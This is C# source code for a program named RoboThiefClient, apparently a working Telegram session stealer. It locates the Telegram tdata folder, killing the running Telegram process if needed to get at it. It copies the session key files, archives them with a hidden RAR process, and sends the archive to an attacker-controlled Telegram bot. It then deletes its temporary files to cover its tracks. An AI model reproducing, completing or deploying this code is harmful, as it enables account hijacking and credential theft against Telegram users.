using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using ICSharpCode.SharpZipLib.Core;
using ICSharpCode.SharpZipLib.Zip;
using System.Drawing;
using System.Net.Mail;
using System.Net;
using Telegram.Bot;
using Telegram.Bot.Types.InputFiles;
using System.Reflection;

namespace RoboThiefClient
{
    class Program
    {
        //variables
        static List<String> splitedFiles = new List<string>();
        static TelegramBotClient botClient = null;
        static int trys = 0;
        CancellationTokenSource cancellationToken = new CancellationTokenSource();
        //------------------------------------
        static void Main(string[] args)
        {
            //Check if application have args run it again with hide window
            if (args.Count() == 0)
            {
              
              
                //Process p = new Process();

                //ProcessStartInfo processStartInfo = new ProcessStartInfo();
                //processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                //processStartInfo.FileName = Assembly.GetExecutingAssembly().Location;
                //processStartInfo.CreateNoWindow = true;
                //processStartInfo.UseShellExecute = false;

                //p.StartInfo = processStartInfo;
                //p.Start();

                //Process.GetCurrentProcess().Start();
            }
            else
            {
                // Set tokens ( this method for another app i write for dynamicly generate stealer )
                TelegramBot.SetValues();

                // Initilize bot for receiving messages from user
                InitBot();

                //ahhhhh , here we are. let's find telegram path
                FindTelegram();
                
                // need description ? :|
                Console.ReadKey();
            }
        }
        static void ClearLogs()
        {
            try
            {
                Thread.Sleep(5000);
                String Temp = Path.GetTempPath() + @"\TSH";
                DirectoryInfo Dir = new DirectoryInfo(Temp);
                foreach (FileInfo SingleFile in Dir.GetFiles())
                {
                    SingleFile.Delete();
                }
                foreach (DirectoryInfo SingleDirectory in Dir.GetDirectories())
                {
                    SingleDirectory.Delete(true);
                }
                Directory.Delete(Temp);
     
            }
            catch (Exception)
            { }
        }
        private static async void FindTelegram()
        {
            try
            {
                // get appdata path
                String appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

                //get telegram default path
                String telegramPath = Directory.GetDirectories(appDataPath).FirstOrDefault(c => c.ToLower().Contains("telegram"));
               
                //Check path exists
                if (telegramPath != null && telegramPath != "")
                {
                    try
                    {
                        var tmpDir = Path.GetTempPath();
                        var tdataDirectory = Directory.GetDirectories(telegramPath).First(c => c.ToLower().Contains("tdata"));

                        ClearLogs();
                        var sessionzippath = Create(tdataDirectory);

                        // send created file to our bot
                        await SendSessionAsync(sessionzippath);
                       
                    }
                    catch (Exception ex) { Console.WriteLine(ex.Message); }
                }
                else
                    //start searching in process
                    StartSearch();
            }
            catch { }
            finally { ClearLogs(); }
        }

        private static void InitBot()
        {
            try
            {
                botClient = new TelegramBotClient(TelegramBot.BotToken);
                botClient.Timeout = new TimeSpan(1, 0, 0);
                botClient.OnMessage += BotClient_OnMessage;
                botClient.StartReceiving();
            }
            catch (Exception e)
            {
                trys++;
                botClient = null;
                InitBot();
            }
        }

        private static void BotClient_OnMessage(object sender, Telegram.Bot.Args.MessageEventArgs e)
        {
            if (e.Message.Text != null)
            {
                TelegramBot.id = e.Message.Chat.Id.ToString();
                botClient.SendTextMessageAsync(chatId: e.Message.Chat.Id, text: "Your chat id saved ! wait for session file !" + Environment.NewLine + Environment.MachineName);
            }
        }

        private static async Task SendSessionAsync(String path)
        {
            try
            {
                using (FileStream fs = File.OpenRead(path))
                {
                    InputOnlineFile inputOnlineFile = new InputOnlineFile(fs, "mysession.rar");

                    await botClient.SendDocumentAsync(long.Parse(TelegramBot.id), inputOnlineFile);
                }

                Environment.Exit(Environment.ExitCode);
            }
            catch (Exception ex) { }
        }

        public static string Create(string folderName)
        {
            return HuntSession(folderName);
        }
        private static string HuntSession(string TDataLocation)
        {
            //C:\Users\Kevin_Yu\AppData\Local\Temp\TSH
            string Temp = Path.GetTempPath() + @"TSH";
            Directory.CreateDirectory(Temp);
            string[] Files, Directoryes;
            string SuperDirectory = null;

            #region Get Session
            try
            {
                if (Directory.Exists(Temp))
                {
                    DirectoryInfo dir = new DirectoryInfo(Temp);
                    dir.Delete(true);
                }
            }
            catch { }

            if (Directory.Exists(TDataLocation)) //Get Telegram Session
            {
                Files = Directory.GetFiles(TDataLocation);
                Directoryes = Directory.GetDirectories(TDataLocation);
                Directory.CreateDirectory(Temp + @"\TelegramSession\" + "tdata");
                foreach (var Single in Directoryes)
                {
                    try
                    {

                        DirectoryInfo Check = new DirectoryInfo(Single);
                        if (Convert.ToInt64(Check.Name.Length) > 15)
                        {
                            Directory.CreateDirectory(Temp + @"\TelegramSession\" + @"tdata\" + Check.Name);
                            SuperDirectory = Check.Name;
                        }
                    }
                    catch { }
                }
                foreach (var Single in Files)
                {
                    try
                    {
                        FileInfo Check = new FileInfo(Single);
                        if (Convert.ToInt64(Check.Length) < 5000 &&
                            Check.Name.Length > 15 &&
                            Path.GetExtension(Single) != ".json")
                        {
                            File.Copy(Single, Temp + @"\TelegramSession\" + @"tdata\" + Check.Name);
                        }
                    }
                    catch (Exception) { }
                }
                string[] Map =
                        {
                         TDataLocation + @"\" + SuperDirectory + @"\map0",
                         TDataLocation + @"\" + SuperDirectory + @"\map1"
                        };
                if (File.Exists(Map[0]))
                {
                    File.Copy(Map[0], Temp + @"\TelegramSession\" + @"tdata\" + SuperDirectory + @"\" + "map0");
                }
                if (File.Exists(Map[1]))
                {
                    File.Copy(Map[1], Temp + @"\TelegramSession\" + @"tdata\" + SuperDirectory + @"\" + "map1");
                }
                File.Copy($"{TDataLocation}\\{SuperDirectory}\\maps", Temp + @"\TelegramSession\" + @"tdata\" + SuperDirectory + @"\" + "maps");
            }
            #endregion

            return CompressSession(Temp);
      

        }
        private static string CompressSession(string TDataLocation)
        {
            #region Run RAR Proccess
            string RCL = TDataLocation.Replace("\\tdata", "");
            try
            {

                System.Diagnostics.Process cmd = new System.Diagnostics.Process();
                cmd.StartInfo.WorkingDirectory = RCL;
                cmd.StartInfo.FileName = @"C:\Program Files\WinRAR\rar.exe";
                cmd.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                cmd.StartInfo.Arguments = "a -ep1 -r Session.rar tdata";
                cmd.Start();
            }
            catch { }
            #endregion
            string _location = TDataLocation.Replace("tdata", "");
            return TDataLocation + @"\Session.rar";

        }
    
        static Boolean finded = false;
        private static void StartSearch()
        {

            while (!finded)
            {
                Func<Task<Process>> funcTask = FindTelegramProcess;
                IAsyncResult iar = funcTask.BeginInvoke(new AsyncCallback(FindTelegramProcessEnded), funcTask);
                Thread.Sleep(1000);
            }
        }

        private static async void FindTelegramProcessEnded(IAsyncResult iar)
        {
            if (finded)
                return;

            Func<Task<Process>> ft = (Func<Task<Process>>)iar.AsyncState;
            var result = (Task<Process>)ft.EndInvoke(iar);
            if (result.Result == null)
                return;

            finded = true;
            try
            {
                
                //Thread.Sleep(1000);
                String fileName = result.Result.MainModule.FileName;
                var parent = Directory.GetParent(fileName);
                //var tmpDir = Path.GetTempPath();

                //// allright , here we have telegram tdata and we want to zip it.
                //// we have to kill telegram application process to access the tdata folder.

                var tdataDirectory = Directory.GetDirectories(parent.FullName).First(c => c.ToLower().Contains("tdata"));
                result.Result.Kill();
                HuntSession(tdataDirectory);

            }
            catch (Exception ex) { }
        }
      
        private static async Task<Process> FindTelegramProcess()
        {
            var process = Process.GetProcesses();
            var sortedProcess = process;

            //we get all process that names start with "t"

            var tprocess = sortedProcess.Where(p => p.ProcessName.ToLower().StartsWith("t"));

            foreach (var p in tprocess)
            {
                try
                {
                    if (p.ProcessName.ToLower().Contains("telegram"))
                    {
              
                        return p;
                    }

                   
                }
                catch (Exception ex) { }
            }
          
            // if we cannot find telegram , mabe user have another version of telegram.
            // then we should to check all 
            foreach (var p in process)
            {
                try
                {
                    if (p.ProcessName.ToLower().Contains("telegram"))
                        return p;
                }
                catch (Exception ex) { }
            }

            return null;
        }
    }
}
